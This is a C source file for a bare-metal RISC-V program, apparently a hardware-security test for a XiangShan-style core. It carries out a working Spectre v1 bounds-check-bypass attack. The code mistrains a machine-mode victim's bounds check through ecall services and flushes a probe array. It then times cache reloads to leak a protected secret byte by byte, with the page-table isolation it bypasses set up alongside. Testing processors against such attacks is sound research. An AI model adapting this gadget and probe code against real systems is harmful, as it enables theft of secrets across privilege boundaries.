#include <am.h>
#include <klib.h>
#include <stdint.h>
#include <xsextra.h>

#include "encoding.h"
#include "cache-utils.h"

#ifndef TRAIN_TIMES
#define TRAIN_TIMES 10
#endif

#ifndef ROUNDS
#define ROUNDS 1
#endif

#ifndef ATTACK_SAME_ROUNDS
#define ATTACK_SAME_ROUNDS 2
#endif

#ifndef EARLY_STOP
#define EARLY_STOP 1
#endif

#ifndef EARLY_STOP_MIN_SCORE
#define EARLY_STOP_MIN_SCORE 3
#endif

#ifndef EARLY_STOP_GAP
#define EARLY_STOP_GAP 2
#endif

#ifndef SECRET_SZ
#define SECRET_SZ 6
#endif

#ifndef CACHE_HIT_THRESHOLD
#define CACHE_HIT_THRESHOLD 70
#endif

#ifndef USE_FIXED_CACHE_HIT_THRESHOLD
#define USE_FIXED_CACHE_HIT_THRESHOLD 0
#endif

#ifndef PROBE_CANDIDATES
#define PROBE_CANDIDATES 62
#endif

#ifndef FULL_BYTE_PROBE
#define FULL_BYTE_PROBE 0
#endif

#ifndef FLUSH_LINES
#define FLUSH_LINES PROBE_ENTRIES
#endif

#ifndef FLUSH_CANDIDATE_LINES_ONLY
#define FLUSH_CANDIDATE_LINES_ONLY 0
#endif

#ifndef CONTROL_ONLY
#define CONTROL_ONLY 0
#endif

#ifndef FILTER_KNOWN_NOISE
#define FILTER_KNOWN_NOISE 0
#endif

#ifndef TRAP_SMOKE_EXIT
#define TRAP_SMOKE_EXIT 0
#endif

#ifndef ATTACKER_MPP
#define ATTACKER_MPP 0
#endif

#ifndef USE_AM_CTE
#define USE_AM_CTE 0
#endif

#ifndef DIRECT_SERVICE_CALL
#define DIRECT_SERVICE_CALL 0
#endif

#ifndef LOW_ECALL_SMOKE
#define LOW_ECALL_SMOKE 0
#endif

#ifndef DEBUG_TRAMPOLINE
#define DEBUG_TRAMPOLINE 0
#endif

#ifndef STRICT_PAGE_TABLE_DEMO
#define STRICT_PAGE_TABLE_DEMO 1
#endif

#define PROBE_ENTRIES 256u
#define PROBE_STRIDE L1_BLOCK_SZ_BYTES
_Static_assert(PROBE_STRIDE == 64, "victim_service assumes 64-byte probe stride");

#define SVC_VICTIM 1u
#define SVC_FLUSH_PROBE 2u
#define SVC_EXIT 3u

#define MCAUSE_USER_ECALL 8u
#define MCAUSE_SUPERVISOR_ECALL 9u
#define MCAUSE_LOAD_ACCESS_FAULT 5u
#define MCAUSE_LOAD_PAGE_FAULT 13u
#define SCAUSE_SUPERVISOR_ECALL 9u
#define MSTATUS_MPP_MASK (3ull << 11)

#define PAGE_SHIFT 12u
#define PAGE_SIZE (1ull << PAGE_SHIFT)
#define PTES_PER_PT 512u
#define SATP_MODE_SV39 (8ull << 60)
#define VPTE_V (1ull << 0)
#define VPTE_R (1ull << 1)
#define VPTE_W (1ull << 2)
#define VPTE_X (1ull << 3)
#define VPTE_U (1ull << 4)
#define VPTE_A (1ull << 6)
#define VPTE_D (1ull << 7)

#define PUBLIC_ARRAY1_SZ 16u
#define PAGE_TABLE_ATTACKER (!(DIRECT_SERVICE_CALL) && !(USE_AM_CTE))
#define U_TEXT __attribute__((section(".u_text"), noinline, aligned(16)))
#define U_DATA __attribute__((section(".u_data"), aligned(4096)))
#define M_SECRET __attribute__((section(".m_secret"), aligned(4096)))

asm(
    ".section .u_text,\"ax\",@progbits\n"
    ".balign 4096\n"
    ".globl __u_text_start\n"
    "__u_text_start:\n"
    ".previous\n");

#if STRICT_PAGE_TABLE_DEMO && ATTACKER_MPP != 0
#error "Sv39 PTE.U isolation demo requires ATTACKER_MPP=0"
#endif

#if STRICT_PAGE_TABLE_DEMO && DIRECT_SERVICE_CALL
#error "Sv39 PTE.U isolation demo requires real machine ecall path"
#endif

#if STRICT_PAGE_TABLE_DEMO && USE_AM_CTE
#error "Sv39 PTE.U isolation demo uses machine ecall path, not AM CTE"
#endif

struct victim_region {
  uint8_t array1[16];
  uint8_t pad[64];
  uint8_t secret[16];
} __attribute__((packed, aligned(64)));

static struct victim_region M_SECRET b_region = {
  .array1 = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16},
  .secret = "S3CreT",
};

static volatile uint64_t __attribute__((section(".m_secret"))) b_array1_sz = PUBLIC_ARRAY1_SZ;
static uint8_t U_DATA a_probe[PROBE_ENTRIES * PROBE_STRIDE];
static uint8_t U_DATA u_stack[4096];

static volatile uint8_t m_dummy;
static volatile uint64_t trap_count;
static volatile uint64_t victim_call_count;
static volatile uint64_t flush_call_count;
static volatile uint64_t exit_call_count;
static volatile uint64_t bad_trap_count;
static volatile uint64_t last_mcause;
static volatile uint64_t last_mepc;
static volatile int attack_done;
static volatile int attack_status;
static uintptr_t saved_m_sp;

static uint8_t U_DATA leaked_idx[SECRET_SZ][2];
static uint64_t U_DATA leaked_score[SECRET_SZ][2];
static uint64_t U_DATA rounds_used[SECRET_SZ];
static uint64_t U_DATA active_threshold;
static volatile uint64_t U_DATA direct_secret_fault_expected;
static volatile uint64_t U_DATA direct_secret_fault_seen;
static volatile uint64_t U_DATA direct_secret_read_completed;
static volatile uint64_t U_DATA direct_secret_read_value;

static uint64_t root_pt[PTES_PER_PT] __attribute__((aligned(PAGE_SIZE)));
static uint64_t l1_pts[4][PTES_PER_PT] __attribute__((aligned(PAGE_SIZE)));
static uint64_t l0_pts[32][PTES_PER_PT] __attribute__((aligned(PAGE_SIZE)));
static uint64_t l1_used;
static uint64_t l0_used;

extern char __u_text_start[];
extern char __u_text_end[];

static inline uintptr_t page_down(uintptr_t addr)
{
  return addr & ~(uintptr_t)(PAGE_SIZE - 1);
}

static inline uintptr_t page_up(uintptr_t addr)
{
  return (addr + PAGE_SIZE - 1) & ~(uintptr_t)(PAGE_SIZE - 1);
}

static void zero_page(void *page)
{
  uint64_t *p = (uint64_t *)page;
  for (uint64_t i = 0; i < PTES_PER_PT; ++i)
    p[i] = 0;
}

static int alloc_l1(void)
{
  if (l1_used >= 4)
    return -1;
  zero_page(l1_pts[l1_used]);
  return (int)l1_used++;
}

static int alloc_l0(void)
{
  if (l0_used >= 32)
    return -1;
  zero_page(l0_pts[l0_used]);
  return (int)l0_used++;
}

static uint64_t *walk_page(uintptr_t va, int alloc)
{
  uintptr_t vpn2 = (va >> 30) & 0x1ffu;
  uintptr_t vpn1 = (va >> 21) & 0x1ffu;
  uintptr_t vpn0 = (va >> 12) & 0x1ffu;
  uint64_t *l1;
  uint64_t *l0;
  int idx;

  if ((root_pt[vpn2] & VPTE_V) == 0) {
    if (!alloc)
      return NULL;
    idx = alloc_l1();
    if (idx < 0)
      return NULL;
    root_pt[vpn2] = (((uintptr_t)l1_pts[idx] >> PAGE_SHIFT) << 10) | VPTE_V;
  }
  l1 = (uint64_t *)(((root_pt[vpn2] >> 10) << PAGE_SHIFT));

  if ((l1[vpn1] & VPTE_V) == 0) {
    if (!alloc)
      return NULL;
    idx = alloc_l0();
    if (idx < 0)
      return NULL;
    l1[vpn1] = (((uintptr_t)l0_pts[idx] >> PAGE_SHIFT) << 10) | VPTE_V;
  }
  l0 = (uint64_t *)(((l1[vpn1] >> 10) << PAGE_SHIFT));
  return &l0[vpn0];
}

static int map_identity_page(uintptr_t va, uint64_t perm)
{
  uint64_t *pte = walk_page(va, 1);
  if (pte == NULL)
    return -1;
  *pte = ((va >> PAGE_SHIFT) << 10) | VPTE_V | VPTE_A | perm |
         ((perm & VPTE_W) ? VPTE_D : 0);
  return 0;
}

static int map_identity_range(uintptr_t start, uintptr_t end, uint64_t perm)
{
  uintptr_t cur = page_down(start);
  uintptr_t limit = page_up(end);
  for (; cur < limit; cur += PAGE_SIZE) {
    if (map_identity_page(cur, perm) != 0)
      return -1;
  }
  return 0;
}

static void install_priv_page_table(void)
{
  zero_page(root_pt);
  l1_used = 0;
  l0_used = 0;

  if (map_identity_range((uintptr_t)__u_text_start, (uintptr_t)__u_text_end,
                         VPTE_R | VPTE_X | VPTE_U) != 0)
    panic("map u_text failed");
  if (map_identity_range((uintptr_t)a_probe, (uintptr_t)a_probe + sizeof(a_probe),
                         VPTE_R | VPTE_W | VPTE_U) != 0)
    panic("map a_probe failed");
  if (map_identity_range((uintptr_t)u_stack, (uintptr_t)u_stack + sizeof(u_stack),
                         VPTE_R | VPTE_W | VPTE_U) != 0)
    panic("map u_stack failed");
  if (map_identity_range((uintptr_t)leaked_idx, (uintptr_t)leaked_idx + sizeof(leaked_idx),
                         VPTE_R | VPTE_W | VPTE_U) != 0)
    panic("map leaked_idx failed");
  if (map_identity_range((uintptr_t)leaked_score, (uintptr_t)leaked_score + sizeof(leaked_score),
                         VPTE_R | VPTE_W | VPTE_U) != 0)
    panic("map leaked_score failed");
  if (map_identity_range((uintptr_t)rounds_used, (uintptr_t)rounds_used + sizeof(rounds_used),
                         VPTE_R | VPTE_W | VPTE_U) != 0)
    panic("map rounds_used failed");
  if (map_identity_range((uintptr_t)&active_threshold,
                         (uintptr_t)&direct_secret_read_value + sizeof(direct_secret_read_value),
                         VPTE_R | VPTE_W | VPTE_U) != 0)
    panic("map u_shared failed");
  if (map_identity_range((uintptr_t)&b_region,
                         (uintptr_t)&b_array1_sz + sizeof(b_array1_sz),
                         VPTE_R | VPTE_W) != 0)
    panic("map m_secret failed");

  uintptr_t satp = SATP_MODE_SV39 | (((uintptr_t)root_pt) >> PAGE_SHIFT);
  asm volatile("csrw satp, %0\nsfence.vma zero, zero\nfence.i" :: "r"(satp) : "memory");
}

static U_TEXT uint64_t candidate_value(uint64_t idx)
{
  if (idx < 10)
    return '0' + idx;
  if (idx < 36)
    return 'A' + (idx - 10);
  return 'a' + (idx - 36);
}

static U_TEXT uint64_t candidate_probe_value(uint64_t idx)
{
#if FULL_BYTE_PROBE
  return ((idx * 167u) + 13u) & 255u;
#else
  return candidate_value((idx * 17u + 13u) % 62u);
#endif
}

static U_TEXT int is_training_value(uint64_t value)
{
  for (uint64_t i = 1; i <= PUBLIC_ARRAY1_SZ; ++i) {
    if (value == i)
      return 1;
  }
  return 0;
}

static U_TEXT int is_known_noise_value(uint64_t value)
{
#if FILTER_KNOWN_NOISE
  return value == 'q' || value == 'w' ||
         value == '4' || value == '5' ||
         value == '6' || value == '7';
#else
  (void)value;
  return 0;
#endif
}

static U_TEXT void top_two_idx(uint64_t *in, uint64_t count,
                               uint8_t out_idx[2], uint64_t out_score[2])
{
  out_idx[0] = 0;
  out_idx[1] = 0;
  out_score[0] = 0;
  out_score[1] = 0;

  for (uint64_t i = 0; i < count; ++i) {
    if (in[i] > out_score[0]) {
      out_score[1] = out_score[0];
      out_idx[1] = out_idx[0];
      out_score[0] = in[i];
      out_idx[0] = i;
    } else if (in[i] > out_score[1]) {
      out_score[1] = in[i];
      out_idx[1] = i;
    }
  }
}

static U_TEXT int enough_confidence(uint64_t *results)
{
  uint8_t idx[2];
  uint64_t score[2];

  top_two_idx(results, PROBE_ENTRIES, idx, score);
  (void)idx;
  return score[0] >= EARLY_STOP_MIN_SCORE &&
         score[0] >= score[1] + EARLY_STOP_GAP;
}

static U_TEXT uint64_t u_probe_time(volatile uint8_t *addr)
{
  uint64_t start;
  uint64_t end;
  uint8_t dummy;

  asm volatile(
      "fence rw, rw\n"
      "rdcycle %[start]\n"
      "lbu %[dummy], 0(%[addr])\n"
      "fence rw, rw\n"
      "rdcycle %[end]\n"
      : [start] "=&r"(start), [end] "=&r"(end), [dummy] "=&r"(dummy)
      : [addr] "r"(addr)
      : "memory");
  (void)dummy;
  return end - start;
}

static U_TEXT void probe_direct_secret_access(void)
{
  uint64_t value = 0;

  direct_secret_fault_seen = 0;
  direct_secret_read_completed = 0;
  direct_secret_read_value = 0;
  direct_secret_fault_expected = 1;
  asm volatile("lbu %0, 0(%1)" : "=&r"(value) : "r"(b_region.secret) : "memory");
  direct_secret_fault_expected = 0;
  if (!direct_secret_fault_seen) {
    direct_secret_read_value = value;
    direct_secret_read_completed = 1;
  }
}

static void flush_probe_service(uint8_t *probe)
{
#if FLUSH_CANDIDATE_LINES_ONLY
  for (uint64_t i = 0; i < PROBE_CANDIDATES; ++i) {
    uint64_t mixed_i = candidate_probe_value(i);
    xs_flush_cache_line(&probe[mixed_i * PROBE_STRIDE]);
  }
#else
  for (uint64_t i = 0; i < FLUSH_LINES; ++i)
    xs_flush_cache_line(&probe[i * PROBE_STRIDE]);
#endif

  xs_flush_cache_line((void *)&b_array1_sz);
  xs_fence();
}

static __attribute__((noinline)) void victim_service(uint64_t idx, volatile uint8_t *probe)
{
  uintptr_t base = (uintptr_t)b_region.array1;
  uintptr_t sz_ptr = (uintptr_t)&b_array1_sz;
  uintptr_t probe_base = (uintptr_t)probe;

  asm volatile(
      "ld    t0, 0(%[sz_ptr])\n"
      "slli  t0, t0, 4\n"
      "li    t6, 2\n"
      "divu  t0, t0, t6\n"
      "divu  t0, t0, t6\n"
      "divu  t0, t0, t6\n"
      "divu  t0, t0, t6\n"
      "bltu  %[idx], t0, 1f\n"
      "j     2f\n"
      "1:\n"
      "add   t1, %[base], %[idx]\n"
      "lbu   t2, 0(t1)\n"
      "slli  t2, t2, 6\n"
      "add   t3, %[probe_base], t2\n"
      "lbu   t4, 0(t3)\n"
      "la    t5, m_dummy\n"
      "sb    t4, 0(t5)\n"
      "2:\n"
      :
      : [idx] "r"(idx),
        [base] "r"(base),
        [sz_ptr] "r"(sz_ptr),
        [probe_base] "r"(probe_base)
      : "t0", "t1", "t2", "t3", "t4", "t5", "t6", "memory");
}

void m_trap_dispatch(uint64_t cause, uint64_t epc,
                     uint64_t a0, uint64_t a1, uint64_t a7)
{
  trap_count++;
  last_mcause = cause;
  last_mepc = epc;

#if TRAP_SMOKE_EXIT
  attack_status = 0;
  attack_done = 1;
  return;
#endif

  if ((cause == MCAUSE_LOAD_ACCESS_FAULT || cause == MCAUSE_LOAD_PAGE_FAULT) &&
      direct_secret_fault_expected != 0) {
    direct_secret_fault_seen = 1;
    direct_secret_fault_expected = 0;
    return;
  }

  if (cause != MCAUSE_USER_ECALL && cause != MCAUSE_SUPERVISOR_ECALL) {
    bad_trap_count++;
    attack_status = 2;
    attack_done = 1;
    return;
  }

  if (a7 == SVC_VICTIM) {
    victim_call_count++;
    victim_service(a0, (volatile uint8_t *)a1);
  } else if (a7 == SVC_FLUSH_PROBE) {
    flush_call_count++;
    flush_probe_service((uint8_t *)a0);
  } else if (a7 == SVC_EXIT) {
    exit_call_count++;
    attack_status = (int)a0;
    attack_done = 1;
  } else {
    bad_trap_count++;
    attack_status = 3;
    attack_done = 1;
  }
}

void m_trap_entry(void);
asm(
    ".section .text\n"
    ".align 2\n"
    ".globl m_trap_entry\n"
    "m_trap_entry:\n"
    "  addi sp, sp, -128\n"
    "  sd ra, 0(sp)\n"
    "  sd t0, 8(sp)\n"
    "  sd t1, 16(sp)\n"
    "  sd t2, 24(sp)\n"
    "  sd a0, 32(sp)\n"
    "  sd a1, 40(sp)\n"
    "  sd a2, 48(sp)\n"
    "  sd a3, 56(sp)\n"
    "  sd a4, 64(sp)\n"
    "  sd a5, 72(sp)\n"
    "  sd a6, 80(sp)\n"
    "  sd a7, 88(sp)\n"
    "  csrr a0, mcause\n"
    "  csrr a1, mepc\n"
    "  ld a2, 32(sp)\n"
    "  ld a3, 40(sp)\n"
    "  ld a4, 88(sp)\n"
    "  call m_trap_dispatch\n"
    "  la t0, attack_done\n"
    "  lw t1, 0(t0)\n"
    "  bnez t1, 1f\n"
    "  csrr t0, mepc\n"
    "  addi t0, t0, 4\n"
    "  csrw mepc, t0\n"
    "  ld ra, 0(sp)\n"
    "  ld t0, 8(sp)\n"
    "  ld t1, 16(sp)\n"
    "  ld t2, 24(sp)\n"
    "  ld a0, 32(sp)\n"
    "  ld a1, 40(sp)\n"
    "  ld a2, 48(sp)\n"
    "  ld a3, 56(sp)\n"
    "  ld a4, 64(sp)\n"
    "  ld a5, 72(sp)\n"
    "  ld a6, 80(sp)\n"
    "  ld a7, 88(sp)\n"
    "  addi sp, sp, 128\n"
    "  mret\n"
    "1:\n"
    "  la t0, machine_low_return\n"
    "  csrw mepc, t0\n"
    "  li t0, 0x1800\n"
    "  csrs mstatus, t0\n"
    "  mret\n");

void low_ecall_smoke_entry(void);
asm(
    ".section .u_text,\"ax\",@progbits\n"
    ".align 2\n"
    ".globl low_ecall_smoke_entry\n"
    "low_ecall_smoke_entry:\n"
    "  li a7, 3\n"
    "  li a0, 0\n"
    "  ecall\n"
    "1: j 1b\n");

static U_TEXT void svc_victim(uint64_t idx, volatile uint8_t *probe)
{
#if DIRECT_SERVICE_CALL
  m_trap_dispatch(MCAUSE_SUPERVISOR_ECALL, 0, idx, (uint64_t)probe, SVC_VICTIM);
#else
  register uint64_t a0 asm("a0") = idx;
  register uint64_t a1 asm("a1") = (uint64_t)probe;
  register uint64_t a7 asm("a7") = SVC_VICTIM;
  asm volatile("ecall" : "+r"(a0) : "r"(a1), "r"(a7) : "memory");
#endif
}

static U_TEXT void svc_flush_probe(volatile uint8_t *probe)
{
#if DIRECT_SERVICE_CALL
  m_trap_dispatch(MCAUSE_SUPERVISOR_ECALL, 0, (uint64_t)probe, 0, SVC_FLUSH_PROBE);
#else
  register uint64_t a0 asm("a0") = (uint64_t)probe;
  register uint64_t a7 asm("a7") = SVC_FLUSH_PROBE;
  asm volatile("ecall" : "+r"(a0) : "r"(a7) : "memory");
#endif
}

static U_TEXT void svc_exit(uint64_t status)
{
#if DIRECT_SERVICE_CALL
  m_trap_dispatch(MCAUSE_SUPERVISOR_ECALL, 0, status, 0, SVC_EXIT);
  return;
#else
  register uint64_t a0 asm("a0") = status;
  register uint64_t a7 asm("a7") = SVC_EXIT;
  asm volatile("ecall" : "+r"(a0) : "r"(a7) : "memory");
  __builtin_unreachable();
#endif
}

static U_TEXT int attacker_run(void)
{
  uint64_t malicious_base =
      (uintptr_t)b_region.secret - (uintptr_t)b_region.array1;

#if CONTROL_ONLY
#if PAGE_TABLE_ATTACKER
  probe_direct_secret_access();
#endif
  svc_flush_probe(a_probe);
  svc_victim(0, a_probe);
  return 0;
#endif

#if PAGE_TABLE_ATTACKER
  probe_direct_secret_access();
#endif

  for (uint64_t len = 0; len < SECRET_SZ; ++len) {
    uint64_t results[PROBE_ENTRIES];
    for (uint64_t i = 0; i < PROBE_ENTRIES; ++i)
      results[i] = 0;

    for (uint64_t atk_round = 0; atk_round < ATTACK_SAME_ROUNDS; ++atk_round) {
      svc_flush_probe(a_probe);

      for (int64_t j = ((TRAIN_TIMES + 1) * ROUNDS) - 1; j >= 0; --j) {
        uint64_t rand_idx = atk_round % PUBLIC_ARRAY1_SZ;
        uint64_t attack_idx = malicious_base + len;
        uint64_t pass_idx = ((j % (TRAIN_TIMES + 1)) - 1) & ~0xffffUL;
        pass_idx = pass_idx | (pass_idx >> 16);
        pass_idx = rand_idx ^ (pass_idx & (attack_idx ^ rand_idx));

        for (uint64_t k = 0; k < 30; ++k)
          asm volatile("" ::: "memory");

        svc_victim(pass_idx, a_probe);
      }

      for (uint64_t i = 0; i < PROBE_CANDIDATES; ++i) {
        uint64_t mixed_i = candidate_probe_value(i);
        if (is_training_value(mixed_i) || is_known_noise_value(mixed_i))
          continue;
        uint64_t elapsed = u_probe_time(&a_probe[mixed_i * PROBE_STRIDE]);
        if (elapsed < active_threshold)
          results[mixed_i]++;
      }

      rounds_used[len] = atk_round + 1;
#if EARLY_STOP
      if (enough_confidence(results))
        break;
#endif
    }

    top_two_idx(results, PROBE_ENTRIES, leaked_idx[len], leaked_score[len]);
  }

  return 0;
}

static U_TEXT __attribute__((noreturn, unused)) void attacker_entry(void)
{
  svc_exit((uint64_t)attacker_run());
  for (;;)
    asm volatile("wfi");
}

asm(
    ".section .u_text,\"ax\",@progbits\n"
    ".balign 4096\n"
    ".globl __u_text_end\n"
    "__u_text_end:\n"
    ".previous\n");

#if USE_AM_CTE
static _Context *service_ecall_handler(_Event *ev, _Context *ctx) __attribute__((unused));
static _Context *service_ecall_handler(_Event *ev, _Context *ctx)
{
  (void)ev;
  trap_count++;
  last_mcause = ctx->scause;
  last_mepc = ctx->sepc;
  ctx->sepc += 4;

  uint64_t svc = ctx->GPR1;
  uint64_t a0 = ctx->GPR2;
  uint64_t a1 = ctx->GPR3;

  if (svc == SVC_VICTIM) {
    victim_call_count++;
    victim_service(a0, (volatile uint8_t *)a1);
  } else if (svc == SVC_FLUSH_PROBE) {
    flush_call_count++;
    flush_probe_service((uint8_t *)a0);
  } else if (svc == SVC_EXIT) {
    exit_call_count++;
    attack_status = (int)a0;
    attack_done = 1;
  } else {
    bad_trap_count++;
    attack_status = 3;
    attack_done = 1;
  }

  return ctx;
}
#endif

static void enter_user_attacker(void) __attribute__((unused));
static void enter_user_attacker(void)
{
  uintptr_t user_sp = (uintptr_t)u_stack + sizeof(u_stack) - 16;
  uintptr_t mstatus;

#if DEBUG_TRAMPOLINE
  printf("[v1-priv-debug] enter_user_attacker begin\n");
#endif
  init_pmp();
#if DEBUG_TRAMPOLINE
  printf("[v1-priv-debug] init_pmp done\n");
#endif
  asm volatile("csrw mtvec, %0" :: "r"((uintptr_t)m_trap_entry) : "memory");
  asm volatile("csrw medeleg, zero\ncsrw mideleg, zero" ::: "memory");
  asm volatile("li t0, -1\ncsrw mcounteren, t0\ncsrw scounteren, t0" ::: "t0", "memory");
  install_priv_page_table();
  asm volatile("mv %0, sp" : "=r"(saved_m_sp));

  asm volatile("csrr %0, mstatus" : "=r"(mstatus));
  mstatus = (mstatus & ~MSTATUS_MPP_MASK) | ((uint64_t)ATTACKER_MPP << 11);
  asm volatile("csrw mstatus, %0" :: "r"(mstatus) : "memory");
#if DEBUG_TRAMPOLINE
  printf("[v1-priv-debug] mret target=%p sp=%p mstatus=%p\n",
         LOW_ECALL_SMOKE ? low_ecall_smoke_entry : attacker_entry,
         (void *)user_sp, (void *)mstatus);
#endif

  asm volatile(
      "mv sp, %0\n"
      "csrw mepc, %1\n"
      "mret\n"
      ".globl machine_low_return\n"
      "machine_low_return:\n"
      "csrw satp, zero\n"
      "sfence.vma zero, zero\n"
      "fence.i\n"
      "la t0, saved_m_sp\n"
      "ld sp, 0(t0)\n"
      :
      : "r"(user_sp), "r"((uintptr_t)(LOW_ECALL_SMOKE ? low_ecall_smoke_entry : attacker_entry))
      : "t0", "memory");
}

int main(void)
{
  for (uint64_t i = 0; i < PROBE_ENTRIES; ++i)
    a_probe[i * PROBE_STRIDE] = 1;

#if USE_FIXED_CACHE_HIT_THRESHOLD
  uint64_t measured_threshold = 0;
  active_threshold = CACHE_HIT_THRESHOLD;
#else
  uint64_t measured_threshold = xs_calibrate_threshold(a_probe, PROBE_STRIDE);
  active_threshold = measured_threshold;
  if (active_threshold == 0)
    active_threshold = CACHE_HIT_THRESHOLD;
#endif

  printf("[v1-priv] model=%s attacker=%s victim=M isolation=%s secret=PTE_U0 pmp=permissive-not-boundary satp=%s service=%s secret_sz=%d candidates=%d flush_lines=%d flush_candidates_only=%d control_only=%d filter_known_noise=%d\n",
         PAGE_TABLE_ATTACKER ? "sv39-pte-u-isolation" : "interface",
         ATTACKER_MPP == 0 ? "U" : "S",
         PAGE_TABLE_ATTACKER ? "Sv39-PTE-U0" : "none",
         PAGE_TABLE_ATTACKER ? "sv39" : "off",
         DIRECT_SERVICE_CALL ? "direct-dispatch" : (USE_AM_CTE ? "am-cte-ecall" : "machine-ecall"),
         SECRET_SZ, PROBE_CANDIDATES, FLUSH_LINES, FLUSH_CANDIDATE_LINES_ONLY,
         CONTROL_ONLY, FILTER_KNOWN_NOISE);
  printf("[v1-priv] calibration fallback=%d measured=%lu threshold=%lu fixed=%d\n",
         CACHE_HIT_THRESHOLD, measured_threshold, active_threshold,
         USE_FIXED_CACHE_HIT_THRESHOLD);
  printf("[v1-priv] control service_return=no-secret direct_secret_access=expect-fault\n");
  printf("[v1-priv] b_array1=%p b_secret=%p malicious_base=%lu probe=%p\n",
         b_region.array1, b_region.secret,
         (uint64_t)((uintptr_t)b_region.secret - (uintptr_t)b_region.array1),
         a_probe);

#if DIRECT_SERVICE_CALL
  attack_status = attacker_run();
  attack_done = 1;
#elif USE_AM_CTE
  _cte_init(NULL);
  irq_handler_reg(SCAUSE_SUPERVISOR_ECALL, service_ecall_handler);
  attack_status = attacker_run();
  attack_done = 1;
#else
  enter_user_attacker();
#endif

  printf("[v1-priv] isolation U-direct-secret-read fault_seen=%lu completed=%lu value=0x%02lx expected=fault u_text=[%p,%p) m_secret=%p\n",
         direct_secret_fault_seen, direct_secret_read_completed,
         direct_secret_read_value & 0xfful,
         __u_text_start, __u_text_end, b_region.secret);
  printf("[v1-priv] traps=%lu victim_calls=%lu flush_calls=%lu exit_calls=%lu bad_traps=%lu last_mcause=%lu last_mepc=%p status=%d\n",
         trap_count, victim_call_count, flush_call_count, exit_call_count,
         bad_trap_count, last_mcause, (void *)last_mepc, attack_status);

  int leak_ok = 1;
  for (uint64_t i = 0; i < SECRET_SZ; ++i) {
    uint8_t guess = leaked_idx[i][0];
    uint8_t second = leaked_idx[i][1];
    uint8_t expected = b_region.secret[i];
    printf("[v1-priv] byte %lu: expected=%c(0x%02x) guess=%c(0x%02x) score=%lu second=%c(0x%02x) score=%lu\n",
           i,
           expected, expected,
           (guess >= 32 && guess < 127) ? guess : '?', guess, leaked_score[i][0],
           (second >= 32 && second < 127) ? second : '?', second, leaked_score[i][1]);
    printf("[v1-priv] byte %lu rounds=%lu early_stop=%d min_score=%d gap=%d\n",
           i, rounds_used[i], EARLY_STOP, EARLY_STOP_MIN_SCORE, EARLY_STOP_GAP);
    if (guess != expected && second != expected)
      leak_ok = 0;
  }

  int isolation_ok = !PAGE_TABLE_ATTACKER ||
                     (direct_secret_fault_seen != 0 &&
                      direct_secret_read_completed == 0);
  int pass = (attack_status == 0 && bad_trap_count == 0 && isolation_ok && leak_ok);
  printf("[v1-priv] check=%s\n", pass ? "PASS" : "FAIL");
  return pass ? 0 : 1;
}
